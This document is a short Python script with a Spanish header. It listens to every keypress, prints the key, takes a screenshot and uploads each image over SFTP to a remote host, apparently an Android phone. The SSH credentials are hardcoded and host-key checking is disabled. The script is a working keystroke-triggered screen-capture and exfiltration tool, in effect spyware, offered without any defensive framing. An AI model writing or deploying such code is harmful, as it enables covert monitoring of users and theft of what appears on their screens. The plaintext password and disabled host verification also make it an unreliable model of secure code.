'''
Autor : Marco Jhoel Churata Torres
Fecha :	19-08-2020
Nombre : Cap_Pantalla_ServidorSSH.py
'''

import pyautogui
import paramiko
import datetime
from pynput import keyboard

host="192.168.1.3"
port=8022
username="u0_a412"
password="marco"

ssh=paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(host,port,username,password)

sftp=ssh.open_sftp()
	
def tecla_press(key):
	print("Tecla presioanda == {}".format(key))
	imagen=pyautogui.screenshot()
	fecha_t=datetime.datetime.now()
	nombre_img=str(fecha_t).replace(':','.')
	imagen.save(nombre_img+".png")
	archivo_local=nombre_img+".png"
	archivo_remoto="/sdcard/fotos1/"+nombre_img+".png"
	try:
		sftp.put(archivo_local,archivo_remoto)
		print("Enviado")
	except:
		print("Fallo")
	if(format(key)=="Key.esc"):
		print("Saliendo ...")
		return False
		
with keyboard.Listener(tecla_press) as listener:
	listener.join()